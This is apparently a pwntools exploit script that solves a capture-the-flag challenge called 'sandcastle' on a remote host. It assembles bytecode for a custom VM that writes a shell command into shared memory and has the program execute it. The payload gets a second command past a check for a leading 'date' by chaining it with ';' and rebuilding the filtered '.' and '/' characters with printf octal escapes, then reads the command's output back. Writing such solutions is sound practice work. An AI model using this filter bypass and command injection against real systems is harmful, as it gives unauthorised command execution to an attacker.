#!/usr/bin/env python3

from pwn import *


exe = ELF("./sandcastle", checksec=False)
context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript = """
                set follow-fork-mode child
                continue
            """)
    else:
        r = remote("154.57.164.72", 31188)

    return r


# Push N bytes onto the VM stack
def vm_push_to_stack(data: bytes) -> bytes:
    return bytes([0x08, len(data)]) + data


# Copy VM stack data into a shared-memory slot
def vm_stack_to_slot(length: int, slot: int) -> bytes:
    return bytes([0x09, length, slot])


# Copy a shared-memory slot onto the VM stack
def vm_slot_to_stack(length: int, slot: int) -> bytes:
    return bytes([0x0A, length, slot])


# Make dispatcher to execute an external operation
def vm_request(operation: int, argument: int = 0) -> bytes:
    return bytes([0x0C, operation & 0xFF, argument & 0xFF])


# NOTE: To make the challenge work, the "date" binary has to be
#       one directory above the challenge's binary
def main():
    r = conn()
    
    # The validation function accepts anything beginning with "date".
    # Moreover, it removes any '.' and '/' in the input.
    # Said so, we have to print our own '/' and '.' using their escape
    # sequences and the "printf" function.
    # We also need to redirect date's stdout to stderr so fgets()
    # reads the flag from stdout and not the line printed by date
    # (in LOCAL it will still be displayed but not on REMOTE).
    #
    # NOTE: The REMOTE uses a custom shell script to print the
    #       flag, and it saves it on "/". I'm lazy and so I just
    #       created the script on the exact same directory and slightly
    #       changed the command to execute it
    if args.LOCAL:
        command = b"date>&2;$(printf '\\056\\056\\057')flag-reader\x00"
    else:
        command = b"date>&2;$(printf '\\057')flag-reader\x00"

    payload = flat(
        # Shared slot 1 is the command buffer
        vm_push_to_stack(command),
        vm_stack_to_slot(len(command), 1),

        # We request operation 5, which executes our command appened to the string "../"
        # (because the program uses the "date" binary in an upper directory).
        # Command stdout will be placed in the shared slot 2
        vm_request(5),

        # Now we move our command output to slot 0 with the following steps:
        #       slot 2 -> VM stack -> slot 0
        vm_slot_to_stack(0xFF, 2),
        vm_stack_to_slot(0xFF, 0),

        # We request operation 0, which writes slot 0 to stdout
        vm_request(0, 0xFF),

        # Any unknown opcode will terminate the interpreter's read action
        b"\xff"
    )

    r.sendlineafter(b"bytes): ", str(len(payload)).encode())
    r.sendafter(b"Enter program: ", payload)

    flag = r.recvlines(3 if args.LOCAL else 2)[-1].decode()
    log.success(f"Flag: {flag}")


if __name__ == "__main__":
    main()
